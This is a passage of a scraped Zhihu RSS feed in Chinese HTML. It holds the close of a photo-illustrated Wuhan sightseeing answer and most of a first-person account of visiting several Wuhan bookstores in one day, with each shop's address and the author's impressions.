data-caption=\"图上砖沙水泥牌坊式院落门建造于上世纪50年代后，也算很古老了——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-4f649196a234f33a513d8fe9cc5d7f70\" data-watermark-src=\"v2-9d6d04012e8d11d8ae3b9f5a03460d62\" data-private-watermark-src=\"v2-fc86dda04a228e89e886e2cde5a94866\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-95cc32f6d4a5aea5f74611295c7ddfd7_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"圆形红砖建筑围转的店家基本是甜品店和咖啡馆，我经常坐COSTA——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-95cc32f6d4a5aea5f74611295c7ddfd7\" data-watermark-src=\"v2-1da337cb86ba7e5f46e4c028a6b3062c\" data-private-watermark-src=\"v2-338eaa5e2ac6148d447a33dae1383cd0\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e0bf9211ebb1d65c2b1f9cdf1829ea08_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"露天喷泉夜晚是彩色的——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-e0bf9211ebb1d65c2b1f9cdf1829ea08\" data-watermark-src=\"v2-3a82d4fe3dc291e4ce931621ebf60832\" data-private-watermark-src=\"v2-2b870446ec4f444a5606a79704da3ddf\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9267562de11be0a0ab7847f46f412d2b_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"这家餐馆所在是一幢民国时期老公馆——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-9267562de11be0a0ab7847f46f412d2b\" data-watermark-src=\"v2-af4e32355ca3022ff5dadde2f9608c7c\" data-private-watermark-src=\"v2-eaf48de157ce836e0fed720b62928910\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-40131fafe9577812b8c00ed2f43c2d38_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"这个地方没进去过，感觉拍照很美的——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-40131fafe9577812b8c00ed2f43c2d38\" data-watermark-src=\"v2-c9021951096c867ff0aa36d201889725\" data-private-watermark-src=\"v2-8e9c3dc455384b30fc736ceebba16c2e\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-5671fa69e30e000d63963b7f71802821_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-size=\"normal\" data-caption=\"实在不理解为什么总是想要排队——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-5671fa69e30e000d63963b7f71802821\" data-watermark-src=\"v2-75db312df1ddb342a2989ebc092086c6\" data-private-watermark-src=\"v2-40878ee441f0392c58e3b6a380f3bba8\"></p>\n<h3>总结：</h3>\n<p>武汉美的好的值得游的景点还有很多很多，我的文章已经够长了（再写下去点开的人更要骂人了），留给别人推介吧！喜欢武汉了解武汉的人很多，武汉城市文化历史城市景观的研究者也很多。</p>\n<p>本答题制作：胡榴明工作室：</p>\n<p>胡榴明（撰文兼摄影）、胡西雷（摄影）、黄樱子（胡榴明工作助理）。</p>\n<p>2021年9月22日</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ye-li-ge-52?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">胡榴明</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>延伸阅读：<br><a href=\"http://www.zhihu.com/question/462790390?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">武汉有哪些人少性价比高的景点？</a><br><a href=\"http://www.zhihu.com/question/23953863?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">下个月准备去武汉，武汉哪些景点可以去逛一逛？</a><br>\n","link":"http://www.zhihu.com/question/482404961/answer/2084790123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"武汉有哪些有趣的书店？","date":"2021-09-24 08:25:56","description":"\n<p>在武汉待了6年，逛了不少地方，但说起书店，则是最近1年才开始集中逛的。以前我没想过武汉有很多书店，但我自从成为得到APP知识城邦#书店漫步#话题主持人后，我才开始有意识地去了解武汉的书店，<b>到目前为止逛了有30+书店了，包括连锁型书店、独立书店、二手书店。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3f84b4a83100a5369c3ec03b54e7e4a5_720w.jpg?rss\" data-caption=\"\" data-size=\"small\" data-rawwidth=\"1080\" data-rawheight=\"1571\" data-watermark=\"watermark\" data-original-src=\"v2-3f84b4a83100a5369c3ec03b54e7e4a5\" data-watermark-src=\"v2-d25f02fd8cc98982c7c39be3f31f6dbc\" data-private-watermark-src=\"v2-3c84fea9deb8356b04512cac492ba2f1\"></p>\n<p>这篇回答，我和大家聊聊我一天之内逛遍武汉8家书店的经历，并附上这些书店的信息，如果大家觉得有兴趣，后续我会更新更多书店，分享给大家。</p>\n<p>逛书店不易，码字不易，如果觉得有用，希望您能给个赞同，本人不胜感激~</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7678dc007c11d5fa66ea60319de739ce_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"911\" data-rawheight=\"836\" data-watermark=\"watermark\" data-original-src=\"v2-7678dc007c11d5fa66ea60319de739ce\" data-watermark-src=\"v2-cb93d7ab2c9e08095925247defcef4d2\" data-private-watermark-src=\"v2-09ed44b480c9a8f75a9b296574e9beb1\"></p>\n<h2>01 泉之旧书社</h2>\n<p>我们的第一站，是泉之旧书社。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-f6451d0cca585c0576097662ce34ddf2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"868\" data-rawheight=\"649\" data-watermark=\"watermark\" data-original-src=\"v2-f6451d0cca585c0576097662ce34ddf2\" data-watermark-src=\"v2-25200fb718689840f7966cd02081aab4\" data-private-watermark-src=\"v2-0c0dfe5a26b58a1d090b4d96b1e8ec05\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>泉之旧书社 </p>\n<p><b>主营：</b>旧书，以人文社科类型为主</p>\n<p><b>地址：</b>武汉市武昌区中华路街街道司门口青龙巷48号</p>\n<p>虽然3月份的时候，我自个儿曾去过一次，但泉之旧书社“隐藏”在老武昌城区一条小巷里，路线我早忘到了一边，这次和阿威老师去，颇费了一番周折：</p>\n<p>我们一路骑车共享单车，走走停停，穿行在老武昌城区拥挤的街道上，好在导航比较靠谱，在穿过了几栋老式居民楼后，我们到一个岔路口转了个弯，便看到了泉之旧书社的牌匾。</p>\n<p>真是一顿好找~</p>\n<p>彼时正是早上8点多，书店刚开张，屋内依旧昏暗，老板看有人来了，就打开了屋里的灯。</p>\n<p>这不打开不要紧，灯一开，阿威老师看到书店里密密麻麻叠放的旧书，整个人都愣住了，虽然我俩都带着口罩，但我分明能看到他眼里发出的光芒，并且能感觉到他嘴里似乎自言自语地说道：</p>\n<p>“真是个好地方，要淘一大波的书了~！”</p>\n<p>接下来，他也真这么干了，看来我的预料是对的。我在一旁，静静看着他“如饥似渴”地大干一场，顺便给他拍些特写，也当自己的摄影练习了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-bd9bcdcd4237cfde86a3f4fba656b3b4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"865\" data-rawheight=\"864\" data-watermark=\"watermark\" data-original-src=\"v2-bd9bcdcd4237cfde86a3f4fba656b3b4\" data-watermark-src=\"v2-1c7c2ac999e73c9e751cb384097acdfa\" data-private-watermark-src=\"v2-320527e3194392e7693caa3e95e8969b\"></p>\n<p>他的手指极娴熟地划过书架上一本本旧书，眼睛扫过旧书的书脊，那动作行云流水，一看就是经过专业训练的。遇到中意的旧书，就会抽出来翻看，时不时他也向我介绍某本旧书的来历、作者的生平以及这书本身的价值所在，我在一旁听着，若有所悟地点点头。</p>\n<p>这样的过程持续了快2个小时，阿威老师一层书架一层书架的翻阅，最后选了50多本书，以社会学的书籍为主，也涵盖其他领域的一些书籍，总计近300块。</p>\n<p>看着成堆的旧书，我有些发憷，虽然自己平时也是个极爱看书买书的人，但像这种在实体书店成批成批的买，我还是头一次见。</p>\n<p>书太多不方便拿，老板帮我们把书打包好，寄回阿威老师的家里。</p>\n<p>临走前，阿威老师还有些恋恋不舍，他与泉之旧书社合了张影，然后对我说：</p>\n<p>“定安，这真是个极好的旧书店，下次我还要再来光顾~！”</p>\n<p>我点点头，表示赞同。</p>\n<p>在泉之旧书社，我们还遇到了一位大叔，他说自己曾是湖北科技出版社的编辑，如今退休了，常常光顾武汉这些个旧书店，同时，他也表达了如今旧书店生存状态萎缩的担忧。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b24267a6dfe3e452eedab769e5945a28_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"806\" data-watermark=\"watermark\" data-original-src=\"v2-b24267a6dfe3e452eedab769e5945a28\" data-watermark-src=\"v2-48d1b02b8afbb0a9b05a7eee1cf33924\" data-private-watermark-src=\"v2-245bb4c3b60bb660e0d2d5d8caba8acc\"></p>\n<p>我能理解这种担忧，毕竟，在互联网时代，越来越多的人被各种经过精密设计的、充满诱惑的产品吸引了注意力，真正沉下心来看书的人似乎愈来愈少，从经济学的角度来看，需求端的疲软，难免造成供给端的乏力，旧书店的生存之难，似乎是某种宿命。</p>\n<p>但，我们其实也不要太过担忧这种现象，毕竟，很多东西是我们无法控制的，我比较认可的一种状态是：</p>\n<p>趁着这些旧书店还在的时候，多去逛逛，不留未去之遗憾就行。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c3d3fa00a523bc5e7266c789bc351779_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"867\" data-rawheight=\"642\" data-watermark=\"watermark\" data-original-src=\"v2-c3d3fa00a523bc5e7266c789bc351779\" data-watermark-src=\"v2-09ebc24d115c83226a1a8a2b6f32ed8a\" data-private-watermark-src=\"v2-86d581bd790ff0a2f4f2151177f27060\"></p>\n<h2>02 新华书店（珞喻路店）</h2>\n<p>从泉之旧书社出来，已经是中午时分，我们决定先解决午饭的问题，目的地：街道口。</p>\n<p>从街道口公交站下来，前往不远处的群光广场途中，很凑巧地，我们偶遇了一家新华书店。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b4356aea6f686859fe3f0d3bdd792230_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"798\" data-watermark=\"watermark\" data-original-src=\"v2-b4356aea6f686859fe3f0d3bdd792230\" data-watermark-src=\"v2-d40957a9a5ddbc48e582c6e81a489851\" data-private-watermark-src=\"v2-909a713bacca0ecb105ac21e6e146950\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>新华书店（珞喻路店）</p>\n<p><b>主营：</b>书籍类型覆盖较广，以近期出版图书、畅销书居多</p>\n<p><b>地址：</b>武汉市洪山区武珞路800附2号</p>\n<p>起初，我以为这家书店我是第一次来，后来看了看周围街道的环境，我发现，我曾来过这儿。那是2年多前的一天晚上，我因为有些事儿路过街道口，看到这家新华书店，进去逛了逛。但那个时候，这家书店里还是上世纪90年代的风格，里面显得十分朴素，书的种类也不很多，我还以为这书店要凉了呢。</p>\n<p>如今再看，书店已经修葺一新，内部弄得十分有设计感，整体显得高大上了不少。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-abfa357481be3f1c3c0c6cac9e15367a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-abfa357481be3f1c3c0c6cac9e15367a\" data-watermark-src=\"v2-15e3b2457778a6e50e6e6e3f8f501554\" data-private-watermark-src=\"v2-740bfeadcc4402214a8155eeabaf7674\"></p>\n<p>因为肚子饿的缘故，我和阿威老师在这书店较快地浏览了一圈，虽然未做过长时间的逗留，但从书店内部环境的改造升级可以看出，新华书店也在谋求转型。</p>\n<p>在我看来，这是一件好事。谁也不知道未来的书店会是怎样，以及书店是否还会存在，但做出一些改变，摸索着前进，至少说明，有那么一批人，始终珍视着书店的价值。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-cb784b3e986a33e811e3e719ad69a6f3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"807\" data-watermark=\"watermark\" data-original-src=\"v2-cb784b3e986a33e811e3e719ad69a6f3\" data-watermark-src=\"v2-1dd74fd2ea225bed8a5f8a4d7205eda1\" data-private-watermark-src=\"v2-6142e09c05edc1449d2c9def8eb53baf\"></p>\n<h2>03 钟书阁</h2>\n<p>在群光广场7层的U你·天然调味吃罢午饭，我和阿威老师顺便到4楼的钟书阁转了转。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fc85c9d0a65e4a9949467a9a812123c9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"867\" data-rawheight=\"648\" data-watermark=\"watermark\" data-original-src=\"v2-fc85c9d0a65e4a9949467a9a812123c9\" data-watermark-src=\"v2-a726a5b393436765d0c458c8712164ed\" data-private-watermark-src=\"v2-0b13fa22848424901ca525afdb66619f\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>钟书阁</p>\n<p><b>主营：</b>书籍类型覆盖较广，以近期出版图书、畅销书居多</p>\n<p><b>地址：</b>武汉市洪山区珞喻路10号群光广场二期4层</p>\n<p>据我的了解，钟书阁原起源于上海，创始人叫金浩，原来是一名语文老师，后来投身民营书店行业，经过一番努力，将书店开遍了全国主要城市</p>\n<p>钟书阁的出名很大程度在于它独树一帜的设计风格，通过互联网传播效应被众多网友热捧。和很多连锁书店千篇一律的设计风格不同，钟书阁每开到一个新城市，都会将当地文化元素融入到自家书店的设计上来，这也就让全国连锁的钟书阁更能获得当地人的认同，从这一点我们不难得出这样一个结论：</p>\n<p><b>钟书阁不仅仅是一家书店，还是一座城市的文化地标了。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-cc348c0e8f7998e1dc350c031306619d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"868\" data-rawheight=\"643\" data-watermark=\"watermark\" data-original-src=\"v2-cc348c0e8f7998e1dc350c031306619d\" data-watermark-src=\"v2-1b0ff6cdc93bd061f906c52defbb1158\" data-private-watermark-src=\"v2-f87ec99f59cb363a5ae4ce26d7395dad\"></p>\n<p>位于武汉群光广场的钟书阁，总共有3、4两层楼，连接两层楼的楼梯两旁，是排列的密密麻麻的书籍，抬头一望，镜面材质的天花板让整个空间纵深延展不少，我抬头望向天花板里的自己，仿若身处哥特式教堂一般震撼。</p>\n<p>不得不说，这里真是一个拍照打卡的好地方。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-45b49e60510e16eb9f10e0fe293759e2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"477\" data-rawheight=\"642\" data-watermark=\"watermark\" data-original-src=\"v2-45b49e60510e16eb9f10e0fe293759e2\" data-watermark-src=\"v2-1da1d740b288db7bdde9b16503bedb9e\" data-private-watermark-src=\"v2-ef5c1a8c510604427ad100926e396110\"></p>\n<h2>04 华师百草园书店</h2>\n<p>华师百草园书店在群光广场附近，那会儿我听朋友说，这家开了十年之久的书店因为一些不可抗力的原因即将闭店，于是决定过来看看，毕竟过了这个村就没那个店了。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-553141383d1060a7885cd69a6ef32587_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"800\" data-watermark=\"watermark\" data-original-src=\"v2-553141383d1060a7885cd69a6ef32587\" data-watermark-src=\"v2-9383f9f71a61386d8ba07bcf24bf77ff\" data-private-watermark-src=\"v2-bb0b53753ed2311497637c2c89f713b8\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>百草园书店（已关闭）</p>\n<p><b>主营：</b>以人文社科类书籍为主</p>\n<p><b>地址：</b>武汉市洪山区桂元路5号教育技术装备处一号楼阳光码头</p>\n<p>一路导航，拐进一条小巷，上了一个缓坡，转弯一看，旁边立着一处指示牌——“阳光码头”。指示牌上还钉着好些木质的箭头牌，百草园书店“榜上有名”。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-21a4ee904fe05d4a950518e1a6025b35_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"648\" data-rawheight=\"864\" data-watermark=\"watermark\" data-original-src=\"v2-21a4ee904fe05d4a950518e1a6025b35\" data-watermark-src=\"v2-0304e25b817c91d7a79b9de035a330ee\" data-private-watermark-src=\"v2-a55aed9ba567f38c474c21d1260e7926\"></p>\n<p>顺着箭头望去，我和阿威老师看见不远处有个小院，院里的一家门店聚了不少人。</p>\n<p>没猜错的话，那应该就是华师百草园书店了。我们走近一看，还真是。</p>\n<p>因为快要闭店了，百草园书店正在进行着书籍一律5折售卖的活动：</p>\n<p>店外，买书的朋友排起了长队，店员们则忙着处理订单；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-ae6b2258a97addbe3c8d95be2c16fc60_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"807\" data-watermark=\"watermark\" data-original-src=\"v2-ae6b2258a97addbe3c8d95be2c16fc60\" data-watermark-src=\"v2-06133ea84fe60b44be6df8e866ffe0ab\" data-private-watermark-src=\"v2-714d34c8a04f607540ff8e848391393a\"></p>\n<p>店内，书架上的书籍已经所剩无几，但依旧有不少朋友在挑选着书籍。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1583c51b2be8b2bbc093d7e6d4dba0d2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"806\" data-watermark=\"watermark\" data-original-src=\"v2-1583c51b2be8b2bbc093d7e6d4dba0d2\" data-watermark-src=\"v2-c43fb527d2982e2236a2629eeee8cdbe\" data-private-watermark-src=\"v2-2fdd53999ac1b3d3707f62e1b3a5ef83\"></p>\n<p>五折售卖图书是很划算的，喜欢淘书的阿威老师此时又忍不住挑起书来，而我，则在书店里随便走走看看。</p>\n<p>来到书店里的一处房间，我看到有几个人在进行拍摄和采访，一问才知道，这是央视纪录频道的工作人员，他们为了制作一档有关城市与书店的节目（PS. 据说是今年8月播出），慕名来到了百草园书店。</p>\n<p>有位被采访的朋友说：</p>\n<blockquote>“多年前就光顾过这家书店，如今再来，是满满的回忆。喜欢逛书店，喜欢读纸质书，那种感觉是电子书所无法替代的。一个人、一本好书、一杯清茶、一坐便是一个下午~”</blockquote>\n<p>真是种令人驰往的状态，我想，华师百草园书店或许是众多学子，尤其是华师学子的“理想国”吧，这里虽然地方不大，也不是很好找，但确乎是一处安静阅读的好去处。</p>\n<p>可惜，这一切都要成为过去式了。</p>\n<p>……</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a5bafebf78c4fd16ead715b9e39cd1e7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"807\" data-watermark=\"watermark\" data-original-src=\"v2-a5bafebf78c4fd16ead715b9e39cd1e7\" data-watermark-src=\"v2-d514dc6f2f415e741dd01e4a984cec66\" data-private-watermark-src=\"v2-3dcb74b98e98fafd311a38a0bc50d137\"></p>\n<p>约摸1个小时后，阿威老师选完了书，不意外地，又是几十本，一结账，将近1千块，顺便还送了我一本书，我看这百草园书店要闭店了，既然来了，两手空空总不太好吧，凑巧看到钱穆先生的《国史大纲》，打完折才41块，果断入手了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-350355f75fee31157b71c7d11c2584c4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"648\" data-rawheight=\"866\" data-watermark=\"watermark\" data-original-src=\"v2-350355f75fee31157b71c7d11c2584c4\" data-watermark-src=\"v2-d0973446c43712d3c25c753a967bb9b4\" data-private-watermark-src=\"v2-1171d06acae4717f6ce9aba9836dc4dd\"></p>\n<p>我俩从百草园书店出来的时候，依旧能看到有不少朋友前来。百草园书店老板老王一个人默默坐在离书店不远的地方，低头刷着手机，一言不发，我想，此刻的他，心里必然是不舍且难受的吧。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-16684a020f730daaa5a74c0db05f4b11_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"808\" data-watermark=\"watermark\" data-original-src=\"v2-16684a020f730daaa5a74c0db05f4b11\" data-watermark-src=\"v2-146b6fd56f587baf2f84d5bd97f75e44\" data-private-watermark-src=\"v2-f02a0f1a1e53113d521f138176ef2633\"></p>\n<p>对光顾百草园的朋友们想说的话，或许就在5月16日发布的一篇公众号推文里了吧：</p>\n<p>最后，欢迎大家来送别百草园，山高路远，我们换个江湖再见。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d664d53f4282de2a97a4030d8b9378b9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"796\" data-watermark=\"watermark\" data-original-src=\"v2-d664d53f4282de2a97a4030d8b9378b9\" data-watermark-src=\"v2-75a197699e420706819e8833211fb38d\" data-private-watermark-src=\"v2-f9c3da52cfbdd912c1fd5ae1c86eacd6\"></p>\n<h2>05 集成古旧书社</h2>\n<p>从华师百草园出来，我和阿威老师把买来的书打包后交给了快递，然后就接着去逛下一个书店了。</p>\n<p>这是一家位于武汉大学附近的旧书店：</p>\n<p><b>集成古旧书社。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-24eab5e18bb851e68c7e5b4dc7e48281_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"866\" data-rawheight=\"649\" data-watermark=\"watermark\" data-original-src=\"v2-24eab5e18bb851e68c7e5b4dc7e48281\" data-watermark-src=\"v2-97958ef4b12e9f8e0bd4819495aad141\" data-private-watermark-src=\"v2-2781ee56b8f69583f56b27fe2c76a11a\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>集成古旧书社</p>\n<p><b>主营：</b>旧书，以人文社科类书籍为主，自然科学类书籍也有涉及</p>\n<p><b>地址：</b>武汉市洪山区珞珈山街办事处珞狮北路四眼井65号</p>\n<p>集成古旧书社的老板姓吴，今年70多岁了，就叫吴爷爷吧，之前我曾独自拜访过这里，我了解到，这家书店开了30多年了，如今他依旧坚守在这旧书的世界里。</p>\n<p>我和阿威老师进书店的时候，吴爷爷正坐在桌上整理旧书。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-152010903311d1231b96820325b02fc3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"807\" data-watermark=\"watermark\" data-original-src=\"v2-152010903311d1231b96820325b02fc3\" data-watermark-src=\"v2-2310bb2dc78cb3b0634d003acc084a63\" data-private-watermark-src=\"v2-fd2b2f0817f5cd13d8abb2cd822637d6\"></p>\n<p>书店里安安静静的，除了吴爷爷，就我和阿威老师两人。集成古旧书社与我之前见过的旧书店在空间上相较宽敞了许多，内部的布局显得颇为整齐，书架虽然上了年纪，但不同种类的书籍被分得清楚，社科是社科、经济是经济、文献是文献、考研是考研……</p>\n<p>看到这样分类清晰的旧书店布局，阿威老师对我说：</p>\n<p>“这位旧书店的老板一定对书籍有着自己的理解，从这种布局、选书的方向、内容上就能很明显地感受到。”</p>\n<p>我点点头，表示认同。</p>\n<p>或许是因为今天书淘得有点多，逛了一圈下来，阿威老师就挑了几本书，无一例外，多是关于社会学的。</p>\n<p>我问他，你为啥对社会学这么感兴趣？</p>\n<p>阿威老师笑笑，对我说：</p>\n<blockquote>“社会学是系统研究社会行为与人类群体的学科，简单来说，它的研究主题是人。我这么些年在社会上经历了不少事儿，对人本身很感兴趣，因而想花几年的时间较为系统地学习社会学，而旧书店里则恰好有许多与社会学有关的宝贵文献，这也是我为啥喜欢在旧书店淘书的理由。”</blockquote>\n<p>果真，专业人士就是不一样，看问题的角度也这么专业~</p>\n<p>把书结了账，和吴爷爷道了别，我们从书店出来，已经是下午15点半。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fb243bfb478cad219f4993063b57b217_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"806\" data-watermark=\"watermark\" data-original-src=\"v2-fb243bfb478cad219f4993063b57b217\" data-watermark-src=\"v2-f6af30f97f8c3dcc6e6f170b94e3d947\" data-private-watermark-src=\"v2-08472c5a2853939aa5ab4e9704b4fe94\"></p>\n<p>我回头看向集成古旧书社的老式卷帘大门，再看看不远处的川流不息的街道，新旧建筑的交替，在这里，似乎有着某种断续的割裂，这让我不禁想起之前一位得到同学@束航在昆明 给我的留言：</p>\n<blockquote>城市的记忆，还有多少能够保留，就像与这个时代渐行渐远的旧书店，或终将消失殆尽。我时常会想，是不是应该把这些带有时代印记的东西记录下来，它们可能对许多人来说价值不大但并非没有意义。</blockquote>\n<p>我们担心自己某天也会泯于人海，就像这些被许多人抛弃或遗忘的旧物，我们用什么样的态度对待历史，将来的人很有可能就会用什么呀的态度去对待老去的我们。</p>\n<p>给历史的痕迹一点机会，就是给我们的未来一点机会。</p>\n<p>讲真，这段话，写的太好了，全盘引用之~</p>\n<p><img src=\"https://pic1.zhimg.com/v2-89968c994c6553d2c5aaed19ad7317a5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"809\" data-watermark=\"watermark\" data-original-src=\"v2-89968c994c6553d2c5aaed19ad7317a5\" data-watermark-src=\"v2-05abcdcea15b480088dcbd1d50421c62\" data-private-watermark-src=\"v2-70926240b6fe6fa9828c25ffb3c0f422\"></p>\n<h2>06 境自在书店</h2>\n<p>从集成古旧书社出来后，阿威老师跟我说：</p>\n<p>“下一站要不去境自在书店吧，我之前去过一次，感觉还不错。”</p>\n<p>“境自在？”</p>\n<p>听这名字，我有些陌生，也有些好奇。陌生是因为这家书店我头一次听说，好奇则是因为，这家书店的名字听起来有一种庄周的隐逸气质在里头，有种大隐隐于市的感觉，这勾起了我拜访这家书店的欲望。</p>\n<p>我答曰：</p>\n<p><b>“OK，咱们就去这家境自在吧。”</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1c3d5b73cacc1e4d45805d76238fd397_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"798\" data-watermark=\"watermark\" data-original-src=\"v2-1c3d5b73cacc1e4d45805d76238fd397\" data-watermark-src=\"v2-a23c1fafb0cde84f43156b703410487c\" data-private-watermark-src=\"v2-a8989b1475fd58c944cf1942ad2854e1\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>境自在书店</p>\n<p><b>主营：</b>以人文社科类书籍为主，包括近期出版的新书、畅销书等</p>\n<p><b>地址：</b>武汉市江汉区解放大道557号中山广场写字楼19层25室</p>\n<p>我和阿威老师转了两趟公交，从武昌经过长江大桥到汉阳，再从汉阳经过江汉桥到了汉口，穿过老汉口的狭小街巷，来到了中山公园。</p>\n<p>而境自在书店，就在中山公园旁边。</p>\n<p>我没有想到的是，境自在书店在一栋写字楼的19层，一般来说，书店不都是开在一楼、二楼吗？居然还有开在19层的书店？</p>\n<p>坐着电梯到了19层，阿威老师凭着印象带我找到了这家书店。</p>\n<p>整个书店分两间房，境自在书店的老板大石头说，这家书店已经开了7年了，其中一间房是用来售卖书籍和开办读书分享会的，一间房则是用来专门安静阅读的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c17a1cac5a5de053f6a39ee7ab569ef8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"807\" data-watermark=\"watermark\" data-original-src=\"v2-c17a1cac5a5de053f6a39ee7ab569ef8\" data-watermark-src=\"v2-617d163f06f4b4f6be57f5ee90832e7f\" data-private-watermark-src=\"v2-e811b1cfca5562f9025609e4d37f14ef\"></p>\n<p>我环顾书店四周，发现尽管面积不大，估摸不到五十平米的空间，但和书店有关的元素可一点没少：</p>\n<p>摆满书的书架、偶尔可见的几张专辑碟片、一张长桌、两张小沙发、以及两个简单分隔的小间，还有墙上的那幅用隶书写成的“境自在”，让整个书店显得人文气息十足。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-90083dd11076942f0ebe4191818da0e2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"806\" data-watermark=\"watermark\" data-original-src=\"v2-90083dd11076942f0ebe4191818da0e2\" data-watermark-src=\"v2-b5fcc011fa7d956439097e43a33f9de3\" data-private-watermark-src=\"v2-9d7ac7319aae96d56d1e13946260895f\"></p>\n<p>店内的装饰物并不多，若说有，那非整面墙上挂着的大大小小黑板上的手写标语莫属，还有那些贴满书柜门的手写推荐，不管是手写标语，还是手写推荐，字体都很漂亮，内容也很用心，我大致浏览了下，能看出老板大石头是个心思认真细腻的人，而且脑洞也很大，比如说这句：</p>\n<p><b>我希望书（店）就像生活中的一碗“热干面”，好吃实在，虽不奢华，却是不可或缺的食粮。</b></p>\n<p>这比喻，够武汉，够接地气，蛮扎实，我给满分~</p>\n<p><img 